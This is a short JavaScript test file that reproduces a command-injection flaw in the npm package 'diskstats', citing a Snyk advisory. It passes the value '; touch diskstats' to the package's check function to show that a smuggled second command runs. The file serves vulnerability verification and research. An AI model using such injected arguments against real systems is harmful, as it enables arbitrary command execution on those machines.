//https://snyk.io/vuln/SNYK-JS-DISKSTATS-590099
test("Command Injection in diskstats", () => {
  const diskstats = require("diskstats");
  const fs = require("fs");
  const path = "./diskstats";
  const sleep = require("sleep");

  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  diskstats.check("; touch diskstats", () => {
    sleep.sleep(1);
    //checking that its created by after exploit.
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);

    fs.unlinkSync(path); //deleting the file after creation
  });
});
